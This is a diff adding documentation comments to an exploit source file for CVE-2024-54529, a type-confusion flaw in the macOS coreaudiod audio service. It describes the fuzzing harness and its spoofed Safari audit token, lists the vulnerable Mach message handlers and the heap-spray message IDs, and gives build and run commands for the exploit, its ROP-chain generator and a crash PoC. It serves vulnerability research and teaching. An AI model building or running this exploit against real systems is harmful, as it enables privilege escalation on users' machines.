+ *   Line 36: t_Mach_Processing_Function Mach_Processing_Function = NULL;
+ *   Line 37: t_AudioHardwareStartServer AudioHardwareStartServer = NULL;
+ *   Line 38: uint64_t *NextObjectID = NULL;
+ *   Line 39: audit_token_t safari_audit_token;
+ *
+ *   MESSAGE HEADER GENERATION (lines 70-99):
+ *   ─────────────────────────────────────────
+ *   Function: generate_header()
+ *
+ *   Creates mach_msg_header_t with:
+ *   - msg_bits from fuzzer input (line 72)
+ *   - msg_size from fuzzer input or specified (lines 81-85)
+ *   - Random port values for remote/local/voucher (lines 88-90)
+ *   - Message ID from parameter (line 91)
+ *
+ *   TRAILER GENERATION (lines 45-68):
+ *   ───────────────────────────────────
+ *   Function: get_standard_trailer()
+ *
+ *   Creates 32-byte trailer with:
+ *   - msg_trailer_type = 0x00000000
+ *   - msg_trailer_size = 32
+ *   - msg_seqno = 0x00000000
+ *   - msg_sender = 8 bytes zeros
+ *   - safari_audit_token = spoofed audit token
+ *
+ *   KNOWLEDGE-DRIVEN SELECTOR FUZZING (lines 102-137):
+ *   ────────────────────────────────────────────────────
+ *   The harness uses valid selectors to improve coverage:
+ *
+ *   Line 103-105: kValidSelectors = {'grup', 'agrp', 'acom', 'mktp', ...}
+ *     - 'acom' = audio comment (used in heap spray)
+ *     - 'mktp' = make tap (creates Engine objects)
+ *
+ *   Line 107-109: kValidScopes = {'glob', 'inpt', 'outp', ...}
+ *     - 'glob' = global scope (most commonly used)
+ *
+ *   Line 126-137: add_selector_information()
+ *     - 95% probability of using valid selectors (line 131)
+ *     - Places selector/scope/element in last 16 bytes of message body
+ *     - This "knowledge-driven" approach dramatically improves coverage
+ *
+ *   HOW IT WORKS:
+ *   ──────────────
+ *   1. Fuzzer provides random bytes via FuzzedDataProvider
+ *   2. Harness consumes bytes to construct Mach messages
+ *   3. Messages sent directly to _HALB_MIGServer_server (in-process)
+ *   4. Coverage tracked by TinyInst
+ *   5. Crashes recorded for analysis
+ *
+ *   CRITICAL INSIGHT:
+ *   The 95% probability of valid selectors (line 131) is key to the success
+ *   of this fuzzer. Without it, most messages would fail validation and
+ *   not reach deeper code paths where the vulnerability exists.
+ *
+ * ═══════════════════════════════════════════════════════════════════════════
+ * SECTION K: MESSAGE_IDS.H - COMPLETE MESSAGE ENUMERATION
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ *   FILE: helpers/message_ids.h
+ *   LOCATION: /Users/tal/wudan/dojo/CoreAudioFuzz/helpers/message_ids.h
+ *
+ *   COMPLETE ENUMERATION (lines 20-83):
+ *   ─────────────────────────────────────
+ *   XSystem_Open                          = 1010000  (line 21)
+ *   XSystem_Close                         = 1010001  (line 22)
+ *   XSystem_GetObjectInfo                 = 1010002  (line 23) ← Used for enumeration
+ *   XSystem_CreateIOContext               = 1010003  (line 24)
+ *   XSystem_DestroyIOContext              = 1010004  (line 25)
+ *   XSystem_CreateMetaDevice              = 1010005  (line 26) ← Used for heap spray
+ *   ...
+ *   XObject_SetPropertyData               = 1010029  (line 50)
+ *   XObject_SetPropertyData_DI32          = 1010030  (line 51)
+ *   ...
+ *   XObject_SetPropertyData_DPList        = 1010034  (line 55) ← Used for heap spray
+ *   ...
+ *   XIOContext_Fetch_Workgroup_Port       = 1010059  (line 80) ← VULNERABLE HANDLER
+ *   ...
+ *   XSystem_OpenWithBundleIDLinkageAndKindAndSynchronousGroupProperties = 1010061
+ *
+ *   VULNERABLE HANDLERS (all call CopyObjectByObjectID without type check):
+ *   ─────────────────────────────────────────────────────────────────────────
+ *   1010010 - XIOContext_SetClientControlPort  (message_ids.h:31)
+ *   1010011 - XIOContext_Start                 (message_ids.h:32)
+ *   1010012 - XIOContext_Stop                  (message_ids.h:33)
+ *   1010054 - XIOContext_StartAtTime           (message_ids.h:75)
+ *   1010058 - XIOContext_Start_With_WorkInterval (message_ids.h:79)
+ *   1010059 - XIOContext_Fetch_Workgroup_Port  (message_ids.h:80) ← EXPLOITED
+ *
+ *   ADDITIONAL IDS FROM helpers/message.h (lines 86-95):
+ *   ─────────────────────────────────────────────────────
+ *   1010062 - XSystem_OpenWithBundleIDLinkageAndKindAndShmem
+ *   1010063 - XIOContext_Start_Shmem
+ *   1010064 - XIOContext_StartAtTime_Shmem
+ *   1010065 - XIOContext_Start_With_WorkInterval_Shmem
+ *   1010067 - XIOContext_WaitForTap
+ *   1010068 - XIOContext_StopWaitingForTap
+ *   1010069-1010071 - Shmem/Timeout variants
+ *
+ *   OOL DESCRIPTOR SET (helpers/message.h:98):
+ *   ───────────────────────────────────────────
+ *   extern std::set<message_id_enum> ool_descriptor_set;
+ *
+ *   This set tracks which message IDs use OOL (out-of-line) descriptors.
+ *   Messages in this set contain large data payloads sent via vm_map_copy.
+ *   Used by the fuzzer to correctly construct complex messages.
+ *
+ * ═══════════════════════════════════════════════════════════════════════════
+ * SECTION L: COMMANDS TO VERIFY EVERYTHING
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ *   VERIFY COREAUDIOD IS RUNNING:
+ *   ──────────────────────────────
+ *   $ ps aux | grep coreaudiod
+ *   Expected: _coreaudiod  <pid>  /usr/sbin/coreaudiod
+ *
+ *   EXAMINE COREAUDIOD SANDBOX STATUS:
+ *   ────────────────────────────────────
+ *   $ codesign -d --entitlements :- /usr/sbin/coreaudiod
+ *   Note: Should NOT have com.apple.security.app-sandbox
+ *
+ *   LIST AUDIO HAL PLUGINS:
+ *   ─────────────────────────
+ *   $ ls /Library/Audio/Plug-Ins/HAL/
+ *   $ ls /System/Library/Extensions/ | grep -i audio
+ *
+ *   EXAMINE COREAUDIO FRAMEWORK:
+ *   ─────────────────────────────
+ *   $ otool -L /System/Library/Frameworks/CoreAudio.framework/CoreAudio
+ *   $ nm /System/Library/Frameworks/CoreAudio.framework/CoreAudio | grep HALS
+ *
+ *   BUILD THE EXPLOIT:
+ *   ───────────────────
+ *   $ cd /Users/tal/wudan/dojo/CoreAudioFuzz/exploit
+ *   $ python3 build_rop.py
+ *   $ clang++ -framework CoreFoundation -framework Foundation exploit.mm -o exploit
+ *
+ *   BUILD THE POC:
+ *   ────────────────
+ *   $ cd /Users/tal/wudan/dojo/CoreAudioFuzz
+ *   $ clang -framework Foundation cve-2024-54529-poc-macos-sequoia-15.0.1.c -o poc
+ *
+ *   RUN THE POC (causes coreaudiod crash):
+ *   ───────────────────────────────────────
+ *   $ ./poc
+ *   $ ls ~/Library/Logs/DiagnosticReports/coreaudiod*.crash
+ *
+ *   EXAMINE CRASH LOG:
+ *   ───────────────────
+ *   $ cat ~/Library/Logs/DiagnosticReports/coreaudiod*.crash | head -100
+ *   Look for: Exception Type: EXC_BAD_ACCESS
+ *
+ *   ENABLE GUARD MALLOC (for better crash analysis):
+ *   ──────────────────────────────────────────────────
+ *   $ sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.audio.coreaudiod.plist
+ *   $ export MallocPreScribble=1
+ *   $ export MallocScribble=1
+ *   $ sudo /usr/sbin/coreaudiod &
+ *   $ ./poc
+ *
+ *   ATTACH DEBUGGER:
+ *   ─────────────────
+ *   $ sudo lldb -n coreaudiod
+ *   (lldb) c   # Continue
+ *   (In another terminal) $ ./poc
+ *   (lldb) bt  # Backtrace when crash occurs
+ *
+ * ═══════════════════════════════════════════════════════════════════════════
+ * SECTION M: TOOL INSTALLATION COMMANDS
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ *   ROPGADGET (Python package):
+ *   ────────────────────────────
+ *   $ pip3 install ropgadget
+ *   $ ROPgadget --version
+ *   $ ROPgadget --binary /usr/lib/libSystem.B.dylib | head -100
+ *
+ *   ROPPER (Python package):
+ *   ──────────────────────────
+ *   $ pip3 install ropper
+ *   $ ropper -f /usr/lib/libSystem.B.dylib --search "pop rdi"
+ *
+ *   RADARE2 (via Homebrew):
+ *   ─────────────────────────
+ *   $ brew install radare2
+ *   $ r2 /usr/lib/libSystem.B.dylib
+ *   [0x00000000]> /R pop rdi
+ *   [0x00000000]> q
+ *
+ *   GHIDRA (free NSA tool):
+ *   ────────────────────────
+ *   Download from: https://ghidra-sre.org/
+ *   $ unzip ghidra_*.zip
+ *   $ cd ghidra_* && ./ghidraRun
+ *
+ *   TINYINST:
+ *   ──────────
+ *   $ git clone --recursive https://github.com/googleprojectzero/TinyInst
+ *   $ cd TinyInst && mkdir build && cd build
+ *   $ cmake -G Ninja ..
+ *   $ ninja
+ *
+ *   JACKALOPE (fuzzer used by Project Zero):
+ *   ──────────────────────────────────────────
+ *   Part of TinyInst repository:
+ *   $ cd TinyInst/Jackalope
+ *   $ mkdir build && cd build
+ *   $ cmake .. && make
+ *
+ *   FRIDA (for dynamic instrumentation):
+ *   ──────────────────────────────────────
+ *   $ pip3 install frida-tools
+ *   $ frida-ps -D local
+ *
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ * =============================================================================
  * COMPLETE EXPANDED REFERENCE LIST
  * =============================================================================
  *
@@ -8434,6 +9932,7 @@ int main(int argc, char *argv[]) {
  *   https://dmcyk.xyz/post/xnu_ipc_i_mach_messages/
  *   https://projectzero.google/2016/10/taskt-considered-harmful.html
  *   https://opensource.apple.com/source/xnu/
+ *   https://github.com/apple-oss-distributions/xnu
  *
  * IOS EXPLOIT CHAINS:
  *   https://projectzero.google/2019/08/in-wild-ios-exploit-chain-2.html
@@ -8444,25 +9943,41 @@ int main(int argc, char *argv[]) {
  *   https://blog.ret2.io/2018/06/19/pwn2own-2018-root-cause-analysis/
  *   https://blog.ret2.io/2018/07/11/pwn2own-2018-jsc-exploit/
  *   https://blog.ret2.io/2018/07/25/pwn2own-2018-safari-sandbox/
+ *   https://blog.ret2.io/2018/08/28/pwn2own-2018-sandbox-escape/
  *
  * PROJECT ZERO ISSUE TRACKER:
- *   https://project-zero.issues.chromium.org/issues/372511888
- *   https://project-zero.issues.chromium.org/issues/42452370
+ *   https://project-zero.issues.chromium.org/issues/372511888 (CVE-2024-54529)
+ *   https://project-zero.issues.chromium.org/issues/406271181 (Sound Barrier)
+ *   https://project-zero.issues.chromium.org/issues/42452370 (task_t)
  *   https://project-zero.issues.chromium.org/issues/42452484
  *   https://project-zero.issues.chromium.org/issues/42451567
- *   https://project-zero.issues.chromium.org/issues/406271181
  *
  * APPLE SOURCES:
- *   https://github.com/apple-oss-distributions/CF (CFString.c)
+ *   https://github.com/apple-oss-distributions/CF (CFString.c line 166)
+ *   https://github.com/apple-oss-distributions/xnu
  *   https://developer.apple.com/library/archive/documentation/General/Conceptual/DevPedia-CocoaCore/PropertyList.html
  *
  * TOOLS:
  *   https://github.com/googleprojectzero/TinyInst
+ *   https://github.com/googleprojectzero/TinyInst/blob/master/hook.md
  *   https://github.com/googleprojectzero/p0tools/tree/master/CoreAudioFuzz
+ *   https://github.com/googleprojectzero/p0tools/tree/master/CoreAudioFuzz/exploit
+ *
+ * SANDBOX ANALYSIS:
+ *   https://web.archive.org/web/20240519054616/https://newosxbook.com/src.jl?tree=listings&file=/sbtool.c
  *
  * VULNERABILITY DATABASE:
  *   https://nvd.nist.gov/vuln/detail/CVE-2024-54529
  *   https://cwe.mitre.org/data/definitions/843.html
+ *   https://support.apple.com/en-us/121839
+ *
+ * LOCAL FILES IN THIS REPOSITORY:
+ *   exploit/exploit.mm                     - This file (main exploit)
+ *   exploit/build_rop.py                   - ROP chain generator
+ *   helpers/message_ids.h                  - Message ID enumeration
+ *   harness.mm                             - Fuzzing harness
+ *   cve-2024-54529-poc-macos-sequoia-15.0.1.c - Crash PoC
+ *   references_and_notes/xnu/              - XNU kernel source
  *
  * =============================================================================
  * END OF COMPREHENSIVE VULNERABILITY RESEARCH CASE STUDY
